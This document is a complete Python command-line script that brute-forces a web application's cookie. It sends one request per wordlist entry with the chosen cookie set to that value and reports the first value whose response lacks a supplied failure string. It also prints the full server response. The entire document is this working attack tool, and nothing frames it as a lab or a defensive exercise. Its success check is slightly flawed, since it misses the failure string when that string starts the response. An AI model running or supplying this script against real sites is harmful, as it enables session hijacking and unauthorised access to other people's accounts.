import urllib.request
import argparse
import sys

parser = argparse.ArgumentParser()

parser.add_argument("-u","--url",type=str,help="URL of the host")
parser.add_argument("-c","--cookie",type=str,help="Name of the cookie to bruteforce")
parser.add_argument("-w","--wordlist",help="Wordlist to use")
parser.add_argument("-n","--negative",help="String in HTTP response which indicates a negative result")

argv = parser.parse_args()
    
if(len(sys.argv) < 5):
    parser.print_help()
    sys.exit(0)

url = argv.url

with open("{}".format(argv.wordlist),"r") as f:
    for line in f:
        hdr = {"Cookie":"{}={}".format(argv.cookie,line.rstrip())}
        req = urllib.request.Request(url, headers=hdr)
        response = urllib.request.urlopen(req)
        resp = response.read().decode("utf-8")
        if(resp.find(argv.negative)>0):
            print("#Trying cookie: {}".format(line))
        else:
            print("#Trying cookie: {}".format(line))
            print("#MAYDAY, MAYDAY! We got a match: {}".format(line))
            print("--------------------------")
            print("#HTTP Response:")
            print("--------------------------")
            print(resp)
            break
